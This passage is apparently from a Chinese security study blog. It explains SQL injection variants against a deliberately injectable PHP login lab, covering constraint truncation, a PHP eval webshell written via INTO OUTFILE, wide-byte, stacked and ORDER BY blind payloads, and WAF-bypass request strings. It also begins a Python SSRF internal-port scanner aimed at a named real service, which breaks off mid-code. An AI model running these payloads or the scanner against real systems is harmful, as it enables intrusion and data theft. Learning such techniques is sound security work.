href="#登陆前端（post表单提交方式）" class="headerlink" title="登陆前端（post表单提交方式）"></a>登陆前端（post表单提交方式）</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"action_page.php"</span>,<span class="attr">methon</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">First name:<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">"Mickey"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">Last name:<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"Mouse"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="action-page-php"><a href="#action-page-php" class="headerlink" title="action_page.php"></a>action_page.php</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$con = mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"wearefamily"</span>);</span><br><span class="line">mysql_select_db(<span class="string">"usertable"</span>, $con);</span><br><span class="line">$name=$_POST[<span class="string">"name"</span>];</span><br><span class="line">$passwd=$_POST[<span class="string">"password"</span>];</span><br><span class="line"></span><br><span class="line">$check_query = mysql_query(<span class="string">"SELECT userid FROM persons where username = '$name' and passwd ='$passwd'"</span>);</span><br><span class="line">$result = mysql_fetch_array($check_query);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($result) &#123;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"</span></span><br><span class="line"><span class="string">  &lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">  &lt;html&gt;</span></span><br><span class="line"><span class="string">  &lt;head&gt;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    &lt;title&gt;Login&lt;/title&gt;</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  &lt;/head&gt;</span></span><br><span class="line"><span class="string">  &lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;h1&gt;Login successfully!&lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;h2&gt;hello $result &lt;/h2&gt;&lt;/body&gt;</span></span><br><span class="line"><span class="string">    &lt;/html&gt;"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"Error，you are not admitted!: "</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><h4 id="5-一些比较特殊的注入"><a href="#5-一些比较特殊的注入" class="headerlink" title="5.一些比较特殊的注入"></a>5.一些比较特殊的注入</h4><p>接下来将对以上action_page.php做一些修改，就可以实现以下的攻击环境。</p><h5 id="5-1-sql约束攻击"><a href="#5-1-sql约束攻击" class="headerlink" title="5.1 sql约束攻击"></a>5.1 sql约束攻击</h5><ul><li>5.1.1 小常识：<br>在mysql里面的可以用set语句来进行用户变量的定义和修改，同时使用<code>@</code>指定用户变量；同样set语句可以用来动态设定系统变量（设置后只影响当前的客户端），用<code>@@</code>指定系统变量。<a href="http://download.nust.na/pub6/mysql/doc/refman/5.1/zh/database-administration.html#dynamic-system-variables" target="_blank" rel="noopener">mesql常见系统变量传送门(5.3.3.1)</a> </li><li><p>5.1.2 所谓的约束指的就是对于column约束的最大长度，当<code>set @@sql_mode=ANSI</code> 的情况下会造成自截断，然后随意注册新的用户（新的用户名和原有用户名一样，这样在数据插入语句<code>insert into</code>语句会自动实现根据创建表格字段的限制长度来自截断，在<code>select</code>语句中（常常用在判断是否与现有账户重名的先验函数中）不会根据表单字段来自截断）。换而言之，就是攻击者在注册时可以很好的绕过重名检测函数，然后在正真的数据插入时候，实现截断，把原来用户名“覆盖”，这样一来，基于<code>username</code>的资源分配方案就会成功被窃取。</p></li><li><p>5.1.3 hack<br>原始数据表数据<br><img src="/myimages/sql/ini.jpg" alt="image"></p></li></ul><p>注册一个<code>admin .................................1</code>用户，发现注册成功！（“.”表示空格）<br><img src="/myimages/sql/regist.jpg" alt="image"></p><p>注册后的数据表<br><img src="/myimages/sql/aregist.jpg" alt="image">   </p><p>登陆<br><img src="/myimages/sql/attack.jpg" alt="image"></p><ul><li>5.1.4 参考链接<br><a href="https://dhavalkapil.com/blogs/SQL-Attack-Constraint-Based/" target="_blank" rel="noopener">SQL Attack (Constraint-based)</a></li></ul><hr><h5 id="5-2-sql注入之文件操作和传shell"><a href="#5-2-sql注入之文件操作和传shell" class="headerlink" title="5.2 sql注入之文件操作和传shell"></a>5.2 sql注入之文件操作和传shell</h5><p>这个攻击和dns带外攻击的方式有相同的地方，通过一些注入文件操作函数<code>outfile/dumpfile</code>(通过包含文件操作的sql语句直接往本地写入shell文件，或者把本地的文件传输到远端的具有公网的主机。至于需要传输的文件是啥，只要在权限允许范围内，<code>It is up to you</code>),还有就是<code>load_file</code>(你可以重远程加载shell或者一些恶意文件到漏洞机，以方便实现后续的工作)</p><p>以本地wamp为例，这里注意两点，一句话需要双括号括起来，同时在文件地址的书写上注意是<code>&#39;/&#39;</code>而不是<code>&#39;\&#39;</code>,否则写入出错。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &quot;&lt;?php @eval($_POST[&apos;hello&apos;])?&gt;&quot; INTO OUTFILE &quot;C:/wamp64/www/sql/shell.php&quot;;</span><br></pre></td></tr></table></figure></p><h5 id="5-3-sql二次注入"><a href="#5-3-sql二次注入" class="headerlink" title="5.3 sql二次注入"></a>5.3 sql二次注入</h5><p>二次注入单单从字面意思上来看，就是注入不是直接发生的，而是在第二次从数据库中取出污染数据源来合成sql语句的时候在服务器后端脚本语言中产生了错误闭合，从而使得闭合混乱的参数容易被利用。最常用的是手段是在第一次的时候php <code>addlashes（）</code>函数对输入简单进行转义，而不是直接正则替换，这样使得敏感字符例如“\”进入数据库。在数据取出进行第二次类似select查询的时候产生注入点。至于闭合的手段十分灵活，二次利用的正真实现还是比较有难度的。关键在于第二次查询点的寻找以及灵活闭合。最为麻烦的是一些table的字段是限制死了长度的，这就使得注入利用有点鸡肋。笔者认为要想防御这个就得对输入做好严格过滤，同时在关键查询语句上，对数据库里面的数据也要做到相应的检测，而不是完全信任。</p><hr><h5 id="5-4-HPP（http参数污染-HPF-HTTP-Parameter-Fragment-HPC-HTTP-Parameter-Contamination"><a href="#5-4-HPP（http参数污染-HPF-HTTP-Parameter-Fragment-HPC-HTTP-Parameter-Contamination" class="headerlink" title="5.4 HPP（http参数污染),HPF(HTTP Parameter Fragment),HPC(HTTP Parameter Contamination)"></a>5.4 HPP（http参数污染),HPF(HTTP Parameter Fragment),HPC(HTTP Parameter Contamination)</h5><p>HPP:<br>所谓的参数污染就是指在实际web应用中,通常是在实际的apach这类的服务器前面加上一个其他服务器例如tomcat作为waf,那么在这中情况下，就会出现两个服务器如果配置不恰当，对参数的处理不一致，从而造成http参数污染。下面是一些常见的参数不统一造成的参数污染。比较常见的payload如下所示</p><h2 id=""><a href="#" class="headerlink" title=""></a><img src="/myimages/sql/hpp.jpg" alt="image"></h2><p>HPF:<br>这种方法是HTTP分割注入,把需要注入的语句分别包含在两个可控的同一个sql语句里面，从而实现绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?a=1+union/*&amp;b=*/select+1,pass/*&amp;c=*/from+users--</span><br><span class="line"></span><br><span class="line">select * from table where a=1 union/* and b=*/select 1,pass/* limit */from users—</span><br></pre></td></tr></table></figure></p><p>HPC:<br>这一概念见于exploit-db上的paper：Beyond SQLi: Obfuscate and Bypass，Contamination同样意为污染</p><p>RFC2396定义了如下一些字符：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Unreserved: a-z, A-Z, 0-9 and _ . ! ~ * &apos; ()</span><br><span class="line">Reserved : ; / ? : @ &amp; = + $ ,</span><br><span class="line">Unwise : &#123; &#125; | \ ^ [ ] `</span><br></pre></td></tr></table></figure><p>不同的Web服务器处理处理构造得特殊请求时有不同的逻辑：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Query string and Web server response (Example)</span><br><span class="line"></span><br><span class="line">+-----------------------------------------------------------+</span><br><span class="line">| Query String  |    Web Servers response / GET values    |</span><br><span class="line">+-----------------------------------------------------------+</span><br><span class="line">|           | Apache/2.2.16, PHP/5.3.3 | IIS6/ASP    |</span><br><span class="line">+-----------------------------------------------------------+</span><br><span class="line">| ?test[1=2      | test_1=2          | test[1=2    |</span><br><span class="line">| ?test=%        | test=%             | test=    |</span><br><span class="line">| ?test%00=1  | test=1                | test=1    |</span><br><span class="line">| ?test=1%001  | NULL             | test=1    |</span><br><span class="line">| ?test+d=1+2  | test_d=1 2         | test d=1 2   |</span><br><span class="line">+-----------------------------------------------------------+</span><br><span class="line"></span><br><span class="line">Magic character &quot;%&quot; affect to ASP/ASP.NET</span><br><span class="line"></span><br><span class="line">+--------------------------------------------------------------------+</span><br><span class="line">| Keywords         |        WAF     |  ASP/ASP.NET     |</span><br><span class="line">+--------------------------------------------------------------------+</span><br><span class="line">| sele%ct * fr%om..  | sele%ct * fr%om..   | select * from..  |</span><br><span class="line">| ;dr%op ta%ble xxx  | ;dr%op ta%ble xxx  | ;drop table xxx  |</span><br><span class="line">| &lt;scr%ipt&gt;         | &lt;scr%ipt&gt;      | &lt;script&gt;     |</span><br><span class="line">| &lt;if%rame&gt;         | &lt;if%rame&gt;      | &lt;iframe&gt;         |</span><br><span class="line">+--------------------------------------------------------------------+</span><br><span class="line"></span><br><span class="line">#Real world examples:</span><br><span class="line"></span><br><span class="line">1. Bypass Mod_Security SQL Injection rule (modsecurity_crs_41_sql_injection_attacks.conf) </span><br><span class="line"></span><br><span class="line">Forbidden: http://localhost/?xp_cmdshell</span><br><span class="line">Bypassed : http://localhost/?xp[cmdshell</span><br><span class="line"></span><br><span class="line">2. Bypass URLScan 3.1 DenyQueryStringSequences rule</span><br><span class="line"></span><br><span class="line">Forbidden: http://localhost/test.asp?file=../bla.txt</span><br><span class="line">Bypassed : http://localhost/test.asp?file=.%./bla.txt</span><br><span class="line"></span><br><span class="line">3. Bypass AQTRONIX Webknight (WAF for IIS and ASP/ASP.Net)</span><br><span class="line"></span><br><span class="line">Forbidden: http://victim.com/news.asp?id=10 and 1=0/(select top 1 table_name from information_schema.tables)</span><br><span class="line">Bypassed : http://victim.com/news.asp?id=10 a%nd 1=0/(se%lect top 1 ta%ble_name fr%om info%rmation_schema.tables)</span><br></pre></td></tr></table></figure></p><h5 id="5-5-二次解码"><a href="#5-5-二次解码" class="headerlink" title="5.5 二次解码"></a>5.5 二次解码</h5><p>二次解码可以说和hpp有相似之处，都是在web服务器加了waf后的一种常见绕过方式或者说是注入技巧。试想两个服务器都对用户的输入做同样的解码，那么二次加密后的攻击向量必然可以绕过waf的检测，从而影响后端主要服务器的安全。这是一种比较常见的情形。下面收集了一些常见的web类应用的码类。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">unlencode  </span><br><span class="line">base64  </span><br><span class="line">json  </span><br><span class="line">binary  </span><br><span class="line">querystring </span><br><span class="line">htmlencode  </span><br><span class="line">unicode  </span><br><span class="line">php serialize</span><br></pre></td></tr></table></figure></p><hr><h5 id="5-6-宽字节注入"><a href="#5-6-宽字节注入" class="headerlink" title="5.6 宽字节注入"></a>5.6 宽字节注入</h5><ul><li>5.6.1 宽字节注入原理：<br>GBK 占用两字节（也就是宽字节），ASCII占用一字节，PHP中编码默认为utf-8，MYSQL设置的字符集是GBK等宽字节字符集。具体：输入%df和函数执行添加的%5C，被合并成<code>%df%5C</code>。由于GBK是两字节，这个%df%5C被MYSQL识别为GBK。导致本应的%df\ 变成%df%5C。<code>%df%5C</code>在GBK编码中没有对应，所以被当成无效字符  </li><li>5.6.2 重点：宽字节注入发生的位置就是PHP发送请求到MYSQL时，两边的编码不一致，导致转义的<code>\</code>与<code>&#39;</code>在数据库中被当成一个字符，从而<code>&#39;</code>逃逸。</li><li>条件：因此只要第一个字节的ascii码大于128且和%5c结合是一个汉字，就可以成功绕过了。这种场景经常出现在绕过<code>mysql_real_escape_string()</code>，<code>addslashes()</code>函数的情景。<blockquote><p>注意除了数据库设置成gbk编码的方式，其他的ANSI编码族的编码方式都是可以存在宽字节绕过的，如big5等。<br><a href="http://www.mytju.com/classcode/tools/encode_utf8.asp" target="_blank" rel="noopener">一个在线获取宽字节编码的网址</a><br><a href="http://www.ruanyifeng.com/blog/2007/10/ascii_unicode_and_utf-8.html" target="_blank" rel="noopener">编码详解</a></p></blockquote></li></ul><hr><h5 id="5-7-堆叠注入"><a href="#5-7-堆叠注入" class="headerlink" title="5.7 堆叠注入"></a>5.7 堆叠注入</h5><p>所谓的堆叠注入，就是在一般的一次执行一句sql语句的后面加入<code>；</code>来顺序执行多条语句，利用方式给根据实战场景可以比较灵活。</p><hr><h5 id="5-8-order-by注入"><a href="#5-8-order-by注入" class="headerlink" title="5.8 order by注入"></a>5.8 <code>order by</code>注入</h5><p>这里的<code>order by</code> 与 <code>limit</code>sql语句后的注入是与<code>where</code>的注入有所不同，主要差异是where语句后面可以用union来进行联合查询,但是order by与limit后面的注入就是不可以的。在sql注入的初期，我们通常自己构造<code>order by</code> 语句来猜测表的列数和相关列的数据类型。但是这里的<code>order by</code>和我们之前主动构造的<code>order by</code>语句不一样，注入点在服务端sql语句的<code>order by</code>后面，基于sql语句的规范，这里的注入常常是不可以进行运算和<code>union</code>语句的，利用的方式其实本质上还是盲注，只是通过一些逻辑连接来达到目的。  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#语法</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">IF</span>(<span class="number">1</span>=<span class="number">1</span>, <span class="literal">true</span>, <span class="literal">false</span>);</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> <span class="number">1</span>=<span class="number">1</span> <span class="keyword">THEN</span> <span class="literal">true</span> <span class="keyword">ELSE</span> <span class="literal">false</span> <span class="keyword">END</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">--if</span></span><br><span class="line">/?order=IF(1=1,name,price) 通过name字段排序</span><br><span class="line">/?order=IF(1=2,name,price) 通过price字段排序</span><br><span class="line"></span><br><span class="line"><span class="comment">--regexp</span></span><br><span class="line">/?order=(<span class="keyword">select</span>+<span class="number">1</span>+regexp+<span class="keyword">if</span>(<span class="number">1</span>=<span class="number">1</span>,<span class="number">1</span>,<span class="number">0x00</span>)) 正常</span><br><span class="line">/?<span class="keyword">order</span>=(<span class="keyword">select</span>+<span class="number">1</span>+regexp+<span class="keyword">if</span>(<span class="number">1</span>=<span class="number">2</span>,<span class="number">1</span>,<span class="number">0x00</span>)) 错误</span><br><span class="line"></span><br><span class="line"><span class="comment">--updatexml</span></span><br><span class="line">/?<span class="keyword">order</span>=updatexml(<span class="number">1</span>,<span class="keyword">if</span>(<span class="number">1</span>=<span class="number">1</span>,<span class="number">1</span>,<span class="keyword">user</span>()),<span class="number">1</span>) 正确</span><br><span class="line">/?<span class="keyword">order</span>=updatexml(<span class="number">1</span>,<span class="keyword">if</span>(<span class="number">1</span>=<span class="number">2</span>,<span class="number">1</span>,<span class="keyword">user</span>()),<span class="number">1</span>) 错误</span><br><span class="line"></span><br><span class="line"><span class="comment">--extractvallue</span></span><br><span class="line">/?<span class="keyword">order</span>=extractvalue(<span class="number">1</span>,<span class="keyword">if</span>(<span class="number">1</span>=<span class="number">1</span>,<span class="number">1</span>,<span class="keyword">user</span>())) 正确</span><br><span class="line">/?<span class="keyword">order</span>=extractvalue(<span class="number">1</span>,<span class="keyword">if</span>(<span class="number">1</span>=<span class="number">2</span>,<span class="number">1</span>,<span class="keyword">user</span>())) 错误</span><br><span class="line"></span><br><span class="line"><span class="comment">--数据猜解</span></span><br><span class="line">/?<span class="keyword">order</span>=(<span class="keyword">select</span>+<span class="number">1</span>+regexp+<span class="keyword">if</span>(<span class="keyword">substring</span>(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>)=<span class="number">0x72</span>,<span class="number">1</span>,<span class="number">0x00</span>)) 正确</span><br><span class="line">/?<span class="keyword">order</span>=(<span class="keyword">select</span>+<span class="number">1</span>+regexp+<span class="keyword">if</span>(<span class="keyword">substring</span>(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>)=<span class="number">0x71</span>,<span class="number">1</span>,<span class="number">0x00</span>)) 错误</span><br><span class="line">......</span><br></pre></td></tr></table></figure><h5 id="5-9-带外查询"><a href="#5-9-带外查询" class="headerlink" title="5.9 带外查询"></a>5.9 带外查询</h5><ul><li>5.9.1 最常用的通道是DNS，攻击者说服数据库执行一次名称查找，该查找包含一个由攻击者控制的域名并在域名前添加了一些要提取的数据。当请求到达DNS名称服务器后，攻击者就可以查看数据。其他通道还包括HTTP和SMTP</li><li>5.9.2 dns带外查询就是用来突破注入中没有数据回显的情况，通过类似<code>load_file</code>函数将要查询的东西和域名<code>concat</code><br>起来，那么就可以通过<code>dns_log</code>来查看返回的东西，从而加快了没有回显的盲注效率。</li><li>5.9.3 先决条件：<br>MySQL中有一个名为<code>secure_file_priv</code>的全局系统变量。这个变量用于限制数据导入和导出操作造成的影响，例如由<code>LOAD DATA</code> 和<code>SELECT…INTO OUTFILE</code>语句和<code>LOAD_FILE()</code>函数执行的操作。要想在<code>mysql5.7</code>以上的版本有效，必须把其在配置文件设置为<code>null</code>。注意这个文件不可以动态修改，也就是说只能够在还没有启动前就把配置文件写好。</li></ul><h3 id="6-参考文章："><a href="#6-参考文章：" class="headerlink" title="6. 参考文章："></a>6. 参考文章：</h3><p>[1]<a href="http://www.w3school.com.cn/sql/" target="_blank" rel="noopener">w3school</a><br>[2]<a href="http://www.yiibai.com/sql/sql-lpad-function.html" target="_blank" rel="noopener">易佰教程</a><br>[3]<a href="[mysql内置函数汇总](http://www.cnblogs.com/noway-neway/p/5211401.html">mysql官方文档</a>)<br>[4]<a href="http://download.nust.na/pub6/mysql/doc/refman/5.1/en.1" target="_blank" rel="noopener">mysql中文文档</a><br>[5]<a href="https://websec.ca/kb/sql_injection" target="_blank" rel="noopener">国外的sql注入总结网站</a><br>[6]<a href="http://www.cnblogs.com/lcamry/category/846064.html" target="_blank" rel="noopener">sql注入天书</a><br>[7]<a href="https://phpinfo.me/2016/05/10/1210.html" target="_blank" rel="noopener">突破延迟注入和盲注速度限制，利用dns注入快速获取数据</a><br>[8]<a href="http://blog.csdn.net/u011721501/article/details/42874517" target="_blank" rel="noopener">深入探究宽字节注入漏洞与修补原理</a><br>[9]<a href="http://www.freebuf.com/articles/web/31537.html" target="_blank" rel="noopener">浅析白盒审计中的字符编码及SQL注入</a><br>[10]<a href="https://dhavalkapil.com/blogs/SQL-Attack-Constraint-Based/" target="_blank" rel="noopener">SQL Attack (Constraint-based)</a><br>[11]<a href="http://ceye.io/profile" target="_blank" rel="noopener">ceye_dns_log平台</a><br>[12]<a href="https://github.com/BugScanTeam/DNSLog" target="_blank" rel="noopener">DNSlog</a><br>[13]<a href="http://www.mottoin.com/96463.html" target="_blank" rel="noopener">MySQL Out-of-Band 攻击</a><br>[14]<a href="https://www.secpulse.com/archives/57197.html" target="_blank" rel="noopener">MySQL Order By 注入总结</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>poc study</title>
      <link href="/2017/10/16/Learning-with-poc/"/>
      <url>/2017/10/16/Learning-with-poc/</url>
      
        <content type="html"><![CDATA[<h4 id="漏洞发布网站点（乌云备份）"><a href="#漏洞发布网站点（乌云备份）" class="headerlink" title="漏洞发布网站点（乌云备份）"></a><a href="http://www.loner.fm/bugs/bug_detail.php?wybug_id=wooyun-2016-0229611" target="_blank" rel="noopener">漏洞发布网站点（乌云备份）</a></h4><h4 id="关键词：ssrf漏洞"><a href="#关键词：ssrf漏洞" class="headerlink" title="关键词：ssrf漏洞"></a>关键词：ssrf漏洞</h4><h6 id="对源代码的拆分理解"><a href="#对源代码的拆分理解" class="headerlink" title="对源代码的拆分理解"></a>对源代码的拆分理解<a id="more"></a></h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> Queue</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------------------------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> que.qsize() &gt; <span class="number">0</span>:</span><br><span class="line">        ip = que.get()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = <span class="string">"http://tv.phpinfo.me/exp.php?s=ftp%26ip=&#123;ip&#125;%26port=&#123;port&#125;%26data=helo.jpg"</span>.format(</span><br><span class="line">                ip=ip,</span><br><span class="line">                port=<span class="string">"65321"</span>)</span><br><span class="line">            param = &#123;<span class="string">"imgurl"</span>:payload&#125;</span><br><span class="line">            r = requests.post(url,data=param,headers = headers,timeout=<span class="number">2.2</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                payload = <span class="string">"http://tv.phpinfo.me/exp.php?s=ftp%26ip=&#123;ip&#125;%26port=&#123;port&#125;%26data=helo.jpg"</span>.format(</span><br><span class="line">                ip=ip,</span><br><span class="line">                port=<span class="string">"6379"</span>)</span><br><span class="line">                param = &#123;<span class="string">"imgurl"</span>:payload&#125;</span><br><span class="line">                r = requests.post(url,data=param,headers=headers,timeout=<span class="number">2.2</span>)</span><br><span class="line">                lock.acquire()</span><br><span class="line">                <span class="keyword">print</span> ip</span><br><span class="line">                lock.release()</span><br><span class="line">            <span class="keyword">except</span> :</span><br><span class="line">                lock.acquire()</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"&#123;ip&#125;  6379 Open"</span>.format(ip=ip)</span><br><span class="line">                lock.release()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成伪造ip用于请求头</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getIp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> str(random.randint(<span class="number">1</span>, <span class="number">254</span>)) + <span class="string">'.'</span> + str(random.randint(<span class="number">1</span>, <span class="number">254</span>)) + <span class="string">'.'</span> + str(random.randint(<span class="number">1</span>, <span class="number">254</span>)) + <span class="string">'.'</span> + str(random.randint(<span class="number">1</span>, <span class="number">254</span>))</span><br><span class="line"><span class="comment">#--------------------------------------------------------</span></span><br><span class="line">url = <span class="string">"http://st.so.com/stu"</span></span><br><span class="line">threads_count = <span class="number">3</span></span><br><span class="line">que = Queue.Queue()<span class="comment">#实体化fifo的队列</span></span><br><span class="line">lock = threading.Lock()<span class="comment">#实体化一个线程锁</span></span><br><span class="line">threads = []<span class="comment">#建立保存线程的列表</span></span><br><span class="line">ip = <span class="string">"10.121.3."</span><span class="comment">#初始化一个ip网段，实现针对ssrf漏洞的对内网的扫描</span></span><br><span class="line">headers = &#123;<span class="comment">#请求头的构造可通过抓包工具，或者hackbar等小工具实现结构仿造</span></span><br><span class="line">    <span class="string">"Cache-Control"</span>:<span class="string">"max-age=0"</span>,</span><br><span class="line">    <span class="string">"Accept"</span>:<span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"</span>,</span><br><span class="line">    <span class="string">"User-Agent"</span>:<span class="string">"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36"</span>,</span><br><span class="line">    <span class="string">"Cookie"</span>: <span class="string">"__guid=6491553.4279294988408965000.1467944097350.527; PHPSESSID=d88gvotjet30c0cp28iuv1s771; count=45"</span>,</span><br><span class="line">    <span class="string">"Content-Type"</span>:<span class="string">"application/x-www-form-urlencoded"</span>,</span><br><span class="line">    <span class="string">"X-Forwarded-For"</span>:getIp(),</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i <span 